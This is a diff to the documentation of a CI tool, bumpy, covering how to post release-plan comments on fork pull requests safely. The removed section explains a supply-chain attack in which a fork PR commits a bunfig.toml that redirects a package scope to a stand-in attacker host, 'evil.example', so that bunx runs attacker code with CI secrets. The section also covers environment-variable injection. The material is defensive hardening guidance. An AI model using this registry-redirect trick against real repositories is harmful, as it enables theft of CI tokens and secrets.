@@ -26,18 +26,18 @@ These commands facilitate the following:
     GH_TOKEN: ${{ github.token }}
 ```
 
-Give the job `permissions: pull-requests: write`. This runs in the ordinary `pull_request` context — the same trust level as the rest of your CI — so none of the privileged-workflow precautions below apply: you can `bun install` and run bumpy from your devDeps like any other CLI. (If the job already ran `bun install`, `bunx` picks up your pinned version from `node_modules`; otherwise it fetches the latest.)
+Give the job `permissions: pull-requests: write`. This runs in the ordinary `pull_request` context — the same trust level as the rest of your CI — so there's nothing special to be careful about: you can `bun install` and run bumpy from your devDeps like any other CLI. (If the job already ran `bun install`, `bunx` picks up your pinned version from `node_modules`; otherwise it fetches the latest.)
 
 **Fork PRs get the check, but not the comment.** GitHub hands `pull_request` runs from forks a **read-only token and no secrets**, so the comment can't be posted there. `ci check` still runs and fails the job (red ✗) on a missing bump file, with the explanation in the job logs — forks stay gated correctly, you just don't get the rendered comment. For most repos that's the right trade. If you want the comment on fork PRs too, add the two-part setup below.
 
 ## Commenting on fork PRs
 
-A comment is a **write**, and GitHub never gives a `pull_request` run from a fork a write token (read-only at issuance, secrets withheld). So the comment has to be posted from a privileged run in the base-repo context. The safest way is a two-part split where the privileged half **never touches the fork's code or files**:
+**This is optional — set it up only if you want the release-plan comment to appear on PRs from forks.** The `ci check` above already runs on fork PRs and fails them red on a missing bump file; it just can't post the comment there, because GitHub gives a fork's `pull_request` run a read-only token (secrets withheld, writes blocked server-side). Posting requires a privileged run in the base-repo context, and the safe way to get one is a small extra workflow whose privileged half **never touches the fork's code or files**:
 
 1. Your existing `pull_request` check **renders** the comment and uploads it as an artifact.
 2. A small, separate `workflow_run` workflow downloads that artifact and **posts** it.
 
-The poster never checks out the PR, never runs a package manager against fork config, and never reads a fork file — it only posts pre-rendered text. Nothing to harden, no CodeQL alert to dismiss.
+The poster never checks out the PR, never runs a package manager against fork config, and never reads a fork file — it only posts pre-rendered text. (No forks to worry about? You don't need any of this.)
 
 ### 1. Render + upload (in your existing check)
 
@@ -97,125 +97,6 @@ Point `workflows: [...]` at the **name** of whatever runs your check (your exist
 > **The one safety rule.** The uploaded artifact is **untrusted** — it's produced by the unprivileged `pull_request` run from fork-controlled inputs (the comment is rendered from the PR's own bump files, and the run may execute fork code), so treat its contents as attacker-controlled. `bumpy ci comment` uses the body only as comment text and resolves the **target PR from the trusted `workflow_run` event** (`head_sha`), never from the artifact — that's what stops a fork from redirecting the comment onto a different PR or issue. Don't override it with a `--pr` derived from artifact data.
 
 > **Why can't the fork run post it itself?** A fork's `pull_request` token is read-only at issuance and enforced server-side — REST, GraphQL, `gh`, and raw `curl` all 403 on a comment write, and secrets aren't exposed either. The write has to originate from a privileged base-repo run, which is exactly what `workflow_run` provides.
-
-### Alternative: a single `pull_request_target` workflow
-
-If you'd rather have one file than two, a single privileged `pull_request_target` workflow can both read the PR and post the comment. It's more setup-sensitive — it checks out the (untrusted) PR head into a privileged job, so it must be carefully structured never to execute it, and it trips a CodeQL alert you have to dismiss. The `workflow_run` split above avoids all of that; prefer it unless one-file simplicity matters more to you. Copy it as-is (changing only `main` if your base branch differs), and keep the security notes intact.
-
-```yaml
-# .github/workflows/bumpy-check.yaml
-name: Bumpy Check
-
-on: pull_request_target # so it can post comments on fork PRs
-
-permissions:
-  pull-requests: write
-  contents: read
-
-jobs:
-  check:
-    runs-on: ubuntu-latest
-    steps:
-      # 1. TRUSTED checkout of the base branch — bumpy is fetched and run from
-      #    here, so the package-manager config in effect (bunfig.toml, .npmrc)
-      #    is YOURS, not the PR's. Hardcoded "main" (the PR controls its own
-      #    base ref); change it to your base branch.
-      - uses: actions/checkout@v7
-        with:
-          ref: main
-          persist-credentials: false
-
-      # 2. UNTRUSTED PR head into ./pr — only READ from here, never run it.
-      #    actions/checkout@v7 refuses to fetch fork PR code under
-      #    pull_request_target by default; `allow-unsafe-pr-checkout` opts back
-      #    in. It's safe HERE only because ./pr is never installed or run.
-      - uses: actions/checkout@v7
-        with:
-          ref: ${{ github.event.pull_request.head.sha }}
-          path: pr
-          persist-credentials: false
-          allow-unsafe-pr-checkout: true
-
-      - uses: oven-sh/setup-bun@v2
-
-      # ⚠️ DO NOT bun install / npm install / run any script from ./pr ⚠️
-
-      # Read bumpy's version from the TRUSTED base checkout (never from ./pr) and
-      # run it in one step. bunx runs from the trusted root; `--cwd ./pr` only
-      # points bumpy at the PR tree to read its bump files. The version is folded
-      # straight into the command (not written to $GITHUB_ENV) to avoid CodeQL's
-      # actions/envvar-injection sink; quote it so a malformed value can't inject.
-      - name: Bumpy release-plan check
-        run: |
-          VERSION=$(jq -r '.devDependencies["@varlock/bumpy"] // .dependencies["@varlock/bumpy"]' package.json | sed 's/[\^~]//')
-          bunx "@varlock/bumpy@$VERSION" ci check --cwd ./pr
-        env:
-          GH_TOKEN: ${{ github.token }}
-```
-
-#### ⚠️ Security essentials
-
-`pull_request_target` carries a **write token and secrets even on fork PRs** — that's what lets it comment on forks, and why a PR author must never be able to influence what runs. The workflow above handles this; three rules to preserve if you adapt it:
-
-- **Never execute PR code** — no `bun install` / `npm install` (postinstall scripts run), no `bun run <script>` / `npm test`, no building from the PR tree.
-- **Fetch and run bumpy from the trusted base checkout; only _read_ the PR tree** via `--cwd ./pr`. Keep `persist-credentials: false` on both checkouts.
-- **Keep `allow-unsafe-pr-checkout: true` on the `./pr` checkout only.** Since [June 2026](https://github.blog/changelog/2026-06-18-safer-pull_request_target-defaults-for-github-actions-checkout/), `actions/checkout` refuses to fetch fork PR code under `pull_request_target` unless you set this deliberately-conspicuous flag (enforced on `@v7` now, and backported to floating tags like `@v6` on July 16, 2026). It's correct here _because_ `./pr` is read-only data — never add it to a checkout whose code you then install or run.
-
-As a guardrail, `bumpy ci check` **fails** if it runs under `pull_request_target` without an explicit `--cwd` — so an outdated single-checkout workflow surfaces loudly instead of silently staying exploitable. If the working directory is genuinely trusted (e.g. a same-repo, non-fork PR), pass `--cwd .` to acknowledge it. (This is a migration nudge, not a security boundary: a PR that actually hijacked resolution would be running its own bumpy. The fix is the two-checkout layout above.)
-
-> **Using npm / pnpm / yarn?** The same pattern applies — run `npx` / `pnpm dlx` / `yarn dlx` from the trusted root and pass `--cwd ./pr` to bumpy, never the reverse. It matters even more there: pnpm and yarn honor committed config that runs code directly (pnpm's `.pnpmfile.cjs`, yarn's `yarnPath`/`plugins`), not just registry redirects — see the [Turborepo `yarnPath` RCE](https://github.com/vercel/turborepo/security/advisories/GHSA-3qcw-2rhx-2726) for the real-world version.
-
-<details>
-<summary><strong>Why two checkouts? The registry-redirect attack (worth reading before you restructure this)</strong></summary>
-
-The non-obvious risk isn't just running PR scripts — it's **how bumpy itself gets fetched**. Running `bunx @varlock/bumpy@<version>` reads package-manager config (`bunfig.toml`, `.npmrc`) **from the current working directory**. A fork PR can commit one that redirects the `@varlock` scope (or the whole registry) to its own server:
-
-```toml
-# bunfig.toml committed in a malicious PR
-[install.scopes]
-"@varlock" = { url = "https://evil.example/" }
-```
-
-If `bunx` runs with the PR checkout as its working directory, it downloads _the attacker's_ `@varlock/bumpy` — at the exact version you pinned — and executes its bin with your write token and secrets in scope. **Pinning the version is no defense; the version is honored, only the source is swapped.** Same for `npx`/`pnpm`/`yarn`.
-
-The two-checkout layout closes this by **separating where bumpy is fetched from what bumpy reads**:
-
-- bumpy is resolved and run from the **trusted base checkout**, so the `bunfig.toml`/`.npmrc` in effect are yours, not the PR's.
-- `--cwd ./pr` points the already-running bumpy process at the PR tree. The binary is already fetched by then — config in `./pr` is never consulted by a package manager. `bumpy ci check` only reads files and shells out to `git`/`gh`, so it's safe to aim at untrusted source.
-- `persist-credentials: false` keeps the workflow token out of the on-disk `.git/config` sitting next to untrusted code.
-
-**Don't use the single-checkout shortcut.** Checking out the PR head into the workspace root and running `bunx … --cwd .` reopens the hole — that puts the PR's `bunfig.toml`/`.npmrc` back in `bunx`'s working directory. The whole point is that `bunx`'s working directory is trusted.
-
-</details>
-
-<details>
-<summary>How the bumpy version stays in sync (and what to adjust for your setup)</summary>
-
-`jq … package.json` reads bumpy's version from the **base checkout** (`main`) at workflow runtime, so:
-
-- **No version pinned in the workflow file** — Renovate/Dependabot bumps to `package.json` flow through automatically.
-- **Fork PRs can't swap the bumpy version** — the source of truth is `main`, read from the trusted root checkout (never from `./pr`).
-
-Adjust if your setup differs:
-
-- Default branch isn't `main`? Change the `ref: main` in the first checkout to your base branch.
-- `@varlock/bumpy` lives somewhere other than root `package.json` (e.g. a sub-package)? Point the `jq` path at that file.
-
-You can also pin the version directly (`bunx @varlock/bumpy@1.2.3 ci check --cwd ./pr`), but we prefer a single source of truth.
-
-</details>
-
-#### Code scanning (CodeQL) alerts
-
-CodeQL's default setup runs GitHub's Actions security queries, so adopters of this workflow will see one alert worth understanding:
-
-- **`actions/untrusted-checkout/critical`** — **expected, and safe to dismiss as a false positive here.** CodeQL flags any PR-head checkout in a privileged workflow because it can't statically prove the code is never executed. This workflow never executes it: `bunx` runs from the **trusted root** checkout (its `bunfig.toml`/lockfile are yours), `ci check --cwd ./pr` only **reads** the PR's files, and nothing under `./pr` is installed, built, or run.
-
-The workflow above is already written to avoid the other relevant query, **`actions/envvar-injection/critical`** — it folds the resolved version straight into the `bunx` command rather than writing it to `$GITHUB_ENV`. (In a `pull_request_target` workflow CodeQL treats a file-derived value as attacker-controlled, and `$GITHUB_ENV` is a code-execution sink: an attacker-set value with newlines could inject e.g. `NODE_OPTIONS`.) If you adapt the workflow, don't reintroduce a `>> "$GITHUB_ENV"` write.
-
-> **Safety invariant.** The data-only guarantee rests on one rule: **`bumpy ci check` never executes code from its `--cwd` target.** It does not build, run lifecycle/postinstall scripts, or dynamically `import`/`require` any file under that path — it only parses them as data (`.bumpy/*.md`, `package.json`, JSON config). The current implementation upholds this: `ci check` reads JSON/YAML and shells out to `git`/`gh` only, and bumpy's two code-loading paths (custom changelog formatters, custom commit-message modules) are reachable exclusively from `bumpy version` / `bumpy publish` / `ci release`, never from `ci check`.
-
-> **Want zero alerts?** Use the [`workflow_run` split](#commenting-on-fork-prs) above instead — its privileged half never checks out PR code, so there's no `untrusted-checkout` alert and nothing to dismiss. This single-`pull_request_target` workflow is the one-file alternative, and the dismissal here is the cost of that simplicity.
 
 ## Release workflow (recommended: split jobs)
 
